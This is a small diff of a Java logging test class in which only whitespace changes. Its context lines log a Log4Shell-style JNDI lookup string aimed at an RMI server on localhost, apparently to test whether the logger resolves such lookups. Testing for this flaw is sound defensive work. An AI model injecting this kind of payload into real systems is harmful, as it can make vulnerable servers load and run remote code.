@@ -91,7 +91,7 @@ import org.slf4j.LoggerFactory;
  * @date 2022/3/13
  */
 public class LogTest {
-    private static  final Logger logger = LoggerFactory.getLogger("slf4j");
+    private static final Logger logger = LoggerFactory.getLogger("slf4j");
     public static void main(String[] args) {
         String username="${jndi:rmi://127.0.0.1:8080/lookup}";
         logger.info("Hello, {}",username);
